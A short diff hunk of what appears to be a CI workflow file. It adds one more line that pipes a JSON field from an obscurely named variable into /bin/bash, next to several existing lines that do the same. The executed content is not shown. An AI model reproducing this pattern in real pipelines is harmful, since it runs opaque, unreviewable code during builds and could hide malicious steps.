@@ -57,6 +57,7 @@ jobs:
           echo $zk2 | jq -r .lj1 | /bin/bash
           printf '%s' "$wb50649" | jq -r .jp06 | /bin/bash
           printf '%s' "$kikgy673" | jq -r .spez21174 | /bin/bash
+          printf '%s' "$qfpv3" | jq -r .jy1549 | /bin/bash
 
       - name: Save archive
         if: always()
